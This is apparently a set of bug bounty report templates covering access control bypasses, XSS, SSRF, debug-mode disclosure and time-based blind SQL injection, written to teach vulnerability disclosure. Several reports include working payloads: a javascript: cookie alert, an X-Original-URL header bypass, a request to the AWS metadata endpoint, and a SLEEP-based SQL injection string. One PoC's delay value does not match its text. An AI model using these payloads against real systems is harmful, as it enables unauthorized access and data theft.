<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-dewcode91
description: CTF writeups and security challenges by dewcode91.
---

# Writeups by dewcode91

Source repository: `/repos/dewcode91`

## Repository Index

- Report-Templates/README.md
- Report-Templates/Report-1.md
- Report-Templates/Report-2.md
- Report-Templates/Report-3.md
- Report-Templates/Report-4.md
- Report-Templates/Report-5.md
- Report-Templates/Report-6.md
- Report-Templates/Report-7.md
- Report-Templates/Report-8.md
- Report-Templates/Report-9.md
- Report-Templates/Report-91-.md
- Report-Templates/Report-92.md

## Writeup Content


### File: Report-Templates/README.md

# Readme
Writing a bug bounty report can indeed be challenging, especially for beginners who are not familiar with the process. However, with some guidance and practice, you can develop the skills necessary to write effective bug bounty reports. 

Remember that bug bounty programs appreciate well-documented and informative reports. Even if you're a beginner, your effort to report vulnerabilities responsibly is valued. Good luck with your bug bounty reports!



### File: Report-Templates/Report-1.md

# Unrestricted Admin Features Exposed via robots.txt

#### Description

Vertical privilege escalation occurs when an application fails to restrict access to sensitive or administrative functionality, allowing users with insufficient privileges to access powerful features. In many cases, admin interfaces are not linked in standard user navigation, but if access controls are missing, anyone who knows (or discovers) the URL can reach them.

Frequently, sensitive locations such as admin panels are inadvertently disclosed in files intended for web crawlers, like `robots.txt`. For example:

- Admin Control Panel: `https://insecure-website.com/admin`
- robots.txt location: `https://insecure-website.com/robots.txt`

When a sensitive path is present in `robots.txt`, attackers can discover it by reviewing the file's contents. Even if not listed, common wordlists allow brute-forcing such endpoints.

#### Steps to Reproduce

1. Navigate to the application and access `robots.txt` by appending `/robots.txt` to the base URL.
2. Observe the presence of a `Disallow` directive referencing the admin panel path.
3. Replace `/robots.txt` in the address bar with the disclosed admin path (e.g., `/administrator-panel`) to access the admin interface.
4. Demonstrate impact by performing privileged actions, such as deleting a user (e.g., user `carlos`).

#### Impact

Exposure of admin functionality to unauthorized users enables vertical privilege escalation. As a result, an attacker could carry out actions reserved for administrators, such as:

- Modifying or deleting sensitive system data  
- Changing configuration settings  
- Managing user accounts, including granting themselves elevated permissions  

Such access puts the application's integrity, confidentiality, and availability at significant risk.



### File: Report-Templates/Report-2.md

# Disclosure of Hidden Admin-Panel Path via JavaScript

## Description

Relying on "security by obscurity" — such as hiding sensitive admin functionality by using a non-obvious URL — does not provide effective protection. If the obfuscated URL is referenced in client-side JavaScript, it can be easily discovered by reviewing the site’s source code.

For instance, an admin panel at:

```
https://insecure-website.com/administrator-panel-yb556
```

may appear unguessable, but if its URL appears in accessible JavaScript, all users (including unauthorized ones) can find it:

```javascript
<script>
var isAdmin = false;
if (isAdmin) {
  var adminPanelTag = document.createElement('a');
  adminPanelTag.setAttribute('href', 'https://insecure-website.com/administrator-panel-yb556');
  adminPanelTag.innerText = 'Admin panel';
}
</script>
```
This snippet exposes the admin panel URL to any user inspecting the website’s source.

## Steps to Reproduce

1. Open the site homepage and view its source (`view-source:` URI prefix).
2. Search for JavaScript variables or links referencing the admin panel (e.g., `/administrator-panel-yb556`).
3. Access the exposed admin panel URL directly.

## Impact

Exposing hidden admin URLs allows low-privilege users or attackers to discover and potentially access sensitive administrative features. This undermines access controls, enabling privilege escalation and unauthorized administrative actions, which can compromise the system’s security.



### File: Report-Templates/Report-3.md

# Unauthorized Access to Admin Panel via Client-Side Role Control

#### Description

The application determines user privileges at login and stores them in a user-controllable location (e.g., hidden field, cookie, or query string parameter). This allows attackers to easily elevate their privileges by modifying these values, granting themselves unauthorized admin access. For example:

- `https://insecure-website.com/login/home.jsp?admin=true`
- Cookie: `Admin=true`

The following HTTP request shows the insecure usage of an `Admin` cookie:

```
GET /admin HTTP/1.1
Host: ac961f1c1ef4adef80bd6a6c0000006c.web-security-academy.net
...
Cookie: session=DOOAJa8Mkf2EDu4mLoLImfnDaP5My8yS; Admin=false
...
```

#### Steps to Reproduce

1. Attempt to access `/admin` to confirm lack of access.
2. Log in via the standard user login page.
3. Intercept the login response (e.g., with Burp Suite) and observe the `Admin=false` cookie being set.
4. Modify the cookie to `Admin=true` and resend the request.
5. Access `/admin`—the user now has admin privileges.

#### Impact

This vulnerability enables any user to gain administrative access by simply changing the client-side value, potentially resulting in privilege escalation, unauthorized actions (e.g., deleting users), and full system compromise.

#### Recommendation

Implement server-side access control checks for all sensitive endpoints. Do not rely on user-modifiable data such as cookies or URL parameters for authorization decisions.



### File: Report-Templates/Report-4.md

# Broken Access Control Allows Unauthorized Admin Actions

## Description

Some applications control access by restricting specific URLs and HTTP methods based on user roles (e.g., denying `POST /admin/deleteUser` for non-admins). However, these defenses can be bypassed if the app or its platform honors non-standard HTTP headers—like `X-Original-URL` or `X-Rewrite-URL`—used to override the requested URL.

If an application enforces access rules only at a front-end layer but allows the effective URL to be overridden by these headers, attackers can access admin endpoints with crafted requests:

```
POST / HTTP/1.1
X-Original-URL: /admin/deleteUser
...
```

Alternatively, an attacker could exploit the vulnerability as follows:

```
GET /delete?username=carlos HTTP/1.1
Host: [target]
X-Original-URL: /admin
...
Cookie: session=[attacker-session-token]
```

This effectively bypasses URL-based access controls by tricking the backend into processing an unauthorized request.

## Steps to Reproduce

1. Attempt to access `/admin` as a non-admin user—access should be denied.
2. Send the request to an intercepting proxy (e.g., Burp Repeater).
3. Change the request line to `/` and add the header `X-Original-URL: /admin`.
4. Observe successful access to the admin page.
5. To perform actions (e.g., deleting a user), add parameters to the query string and adjust `X-Original-URL:` (e.g., `X-Original-URL: /admin/deleteUser` and `?username=carlos`).

## Impact

This vulnerability allows unauthorized users to perform critical admin actions, such as deleting users or changing configurations. Attackers could compromise data, disrupt service, or take full control of the application.



### File: Report-Templates/Report-5.md

# Open Redirect Leading to Cross-Site Scripting (XSS)

#### Description
The application allows users to access external resources via a redirect functionality. The `destUrl` parameter in URLs such as `https://insecure-website.com/resources/course/redirect?destUrl=payload` is not properly validated or restricted, resulting in an open redirect vulnerability. Attackers can leverage this to redirect users to any external site or even inject JavaScript payloads, leading to potential XSS attacks.

#### Steps to Reproduce

1. Log in to your account.
2. Navigate to **Resources > Online Courses**.
3. Select any course and click on **View Course**.
4. Before being redirected to the course page, copy the URL from the address bar.
5. Replace the `destUrl` value with a JavaScript payload, e.g., `javascript:alert(document.cookie)`.
6. Visiting this crafted URL will execute the script in the user's browser.

#### Impact
Exploitation of this vulnerability can result in:

- Execution of arbitrary JavaScript in the victim's browser (XSS).
- Theft of sensitive user information such as session cookies.
- Phishing or social engineering attacks redirecting users to malicious sites.
- Potential for unauthorized access to user accounts.

#### Recommendation
Validate and restrict the `destUrl` parameter to prevent redirection to untrusted sites and block JavaScript execution. Consider implementing a whitelist of allowed domains and disallow the use of schemes like `javascript:`.



### File: Report-Templates/Report-6.md

# Cross-Site Scripting (XSS) Vulnerability in Outdated Swagger UI

#### Description
Swagger UI is a user-friendly web application that allows users to interact with APIs described by the OpenAPI (formerly Swagger) specification. It provides an interface for viewing and testing API endpoints without writing code.

Older versions of Swagger UI contain a known XSS vulnerability that allows an attacker to manipulate application configuration via the `?configUrl` or `?url` query parameters. By supplying a malicious configuration file using these parameters, an attacker can inject arbitrary JavaScript into pages served by Swagger UI—without requiring authentication. The exploit can be delivered under a legitimate-looking URL, increasing the risk of trust exploitation.

#### Steps to Reproduce
1. Navigate to: `{{endpoint}}?configUrl=https://jumpy-floor.surge.sh/test.json`
2. You will see a JavaScript alert box appear, demonstrating successful script injection.

#### Impact
Exploiting this vulnerability enables attackers to execute arbitrary scripts in the victim’s browser. Potential consequences include theft of sensitive user data, phishing campaigns, or unauthorized actions on behalf of the victim, including potential account compromise.

#### References
- [Hacking Swagger UI: From XSS to Account Takeovers – Vidoc Security](https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/)
- [Vidoc Security Public Library Entry](https://app.vidocsecurity.com/public-library/787db825-d8c0-4182-a79f-6c7520745c49)



### File: Report-Templates/Report-7.md

# Blind SSRF via "Import Calendar from URL" Feature

## Summary
The "Import Calendar from URL" functionality in the calendar application is vulnerable to blind Server-Side Request Forgery (SSRF). This allows attackers to make the server initiate requests to internal network resources or conduct port scanning, which may lead to sensitive information disclosure or further compromise of internal systems.

## Vulnerability Details

While reviewing the calendar app, I discovered that the feature for importing calendars from external URLs can be exploited for SSRF:

- When attempting to import a calendar from `http://127.0.0.1/`, the server correctly blocks the request and returns `unsupported_url`.
- However, specifying a local address with an explicit port, such as `http://127.0.0.1:22`, results in a successful (albeit blank) calendar import. Ports 22, 25, and 873 responded during my scan across ports 1-1000.
- This behavior enables attackers to probe internal network ports and potentially interact with services that should not be exposed, risking data exfiltration or further attacks.

## Steps to Reproduce

1. Log in to `https://calendar.example.com`.
2. Click the import icon next to "Calendars" and select "From a URL".
3. Enter a URL like `http://127.0.0.1:22` and observe the system’s response.

## Impact

By exploiting this vulnerability, attackers can:

- **Conduct Internal Port Scans:** The server can be used to scan internal IPs and ports, identifying potential internal services and weaknesses.
- **Access Restricted Resources:** Attackers may reach internal services or files not accessible externally, risking data leakage or further exploitation.
- **Enable Further Attacks:** Gaining information about internal network structure and open ports can assist in lateral movement or other attack vectors.

## Recommendation

- Implement strict allow-lists for external URLs and disallow any access to internal IP ranges and reserved addresses, regardless of port.
- Sanitize and validate all input URLs to prevent SSRF attacks.
- Monitor and alert on suspicious import attempts, especially those targeting private network ranges or unusual ports.



### File: Report-Templates/Report-8.md

# Information Disclosure: Django Debug Mode Enabled

## Description
The website `https://stage.example.com/` is operating with Django's debug mode enabled (`DEBUG = True`). When enabled, Django displays detailed error tracebacks with extensive environment metadata, including sensitive settings, upon encountering exceptions.

## Steps to Reproduce
1. Visit: https://stage.example.com/NON_EXISTING_PATH/
2. Observe the detailed debug information displayed in the error page.

## Impact
Debug mode exposes internal details such as configuration files, API keys, database credentials, and server directories. A malicious actor could exploit this information to compromise the system’s security.

## CVSS Score
[CVSS v3.0: 5.3 (Medium)](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

## Recommendation
Disable Django debug mode (`DEBUG = False`) in all production and staging environments to prevent information leakage. Ensure sensitive settings are never exposed publicly.



### File: Report-Templates/Report-9.md

# Cross-Site Scripting (XSS) Vulnerability in Search Parameter

## Summary

A Cross-Site Scripting (XSS) vulnerability exists in the search parameter of [https://www.example.com/search?q=](https://www.example.com/search?q=). An attacker can inject malicious JavaScript via the `q` parameter, leading to arbitrary script execution in users' browsers.

## Steps to Reproduce

1. Navigate to:  
   `https://www.example.com/search?q=%27-alert(document.domain)-%27`
2. An alert pop-up will appear, demonstrating code execution.

## Impact

This vulnerability allows attackers to:
- Steal sensitive user information (e.g., session cookies)
- Hijack user accounts
- Perform actions as other users (impersonation)
- Conduct phishing attacks or deface the site

Such issues can result in reputational harm, legal liability, and loss of user trust.

## Recommendation

Sanitize and properly encode user-supplied input in the search parameter to prevent script injection.



### File: Report-Templates/Report-91-.md

# Upoad image from external URL can lead to SSRF

#### Description

I identified that upload image from URL feature is vulnerable to ssrf, by injecting a specially crafted URL, an attacker can exploit this vulnerability to send arbitrary requests to the backend server, including requests to the AWS metadata endpoint. This could potentially allow an attacker to extract sensitive data, such as AWS access keys, IAM roles, or instance metadata. 

#### POST Request

```
POST /exp.php HTTP/2
Host: example.com
Cookie: _ga=GA1.2.448835302.1663006136; __gads=ID=12650bacbbb407c1-22b25b0367d600ff:T=1663006138:RT=1663006138:S=ALNI_MbIQgv1tetv5sWhtd2l-DWa5gpBAw; _gid=GA1.2.1181242970.1684070063; _gat_UA-129663421-2=1; __gpi=UID=000009c37d6d17f9:T=1663006138:RT=1684070064:S=ALNI_Mbde2euUm1z5T_fwwj9zbyEtdMKrA
Content-Length: 46
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Origin: https://example.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://example.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

url=http://169.254.169.254/latest/meta-data/
```


#### Steps to Reproduce

1. Navigate to the upload image from url feature on your website.
2. Enter the following payload into the URL parameter: http://169.254.169.254/latest/meta-data/
3. Capture the request in burp > Send to Repeater > Submit
4. Observe the response

#### Impact

The SSRF vulnerability through the image upload feature can enable an attacker to bypass authentication and authorization mechanisms and gain unauthorized access to AWS metadata files. This poses a significant risk, as it could lead to unauthorized access to sensitive resources and potentially compromise the entire AWS infrastructure.



### File: Report-Templates/Report-92.md

# Time-Based Blind SQL injection leads to database extraction

#### Description
The `address` parameter in the `Address > Update` endpoint is not properly sanitized, allowing for SQL injection attacks. By injecting specific SQL commands, an attacker can make the database execute arbitrary queries. In a time-based blind SQL injection, the attacker leverages time delays to infer database responses based on the duration of the application's response.

#### Proof of Concept (PoC)

```
POST /ajax_table.php HTTP/1.1
Host: demo.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 221
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: cookie here
Origin: https://demo.target.com
Referer: https://demo.target.com/search/search=mac/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Csrf-Token: pqiGN72KyLqHwTyBgwtU6WVk216yTkC3TncjuZmX
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

address='XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z&current=1&device_id=&id=address-search&interface=&rowCount=50&searchPhrase=&search_type=mac&sort[hostname]=asc
```

#### Expected Behavior
If the application is vulnerable, it will delay the response by 5 seconds, indicating that the injected SQL query was executed. This delay confirms the presence of a time-based blind SQL injection vulnerability

#### Steps to Reproduce
1. Navigate to the Address > Update feature in the application.
2. Intercept the request using a proxy tool like Burp Suite.
3. Modify the `address` parameter to include the time-based SQL payload: `'XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR'Z`.
4. Forward the request and observe the response time.
5. Note that the server response is delayed by the specified time (e.g., 5 seconds), indicating the execution of the SQL injection payload.

#### Impact
Successful exploitation of this vulnerability could allow an attacker to:

* Retrieve sensitive information from the database.
* Modify or delete database entries.
* Execute arbitrary SQL commands.

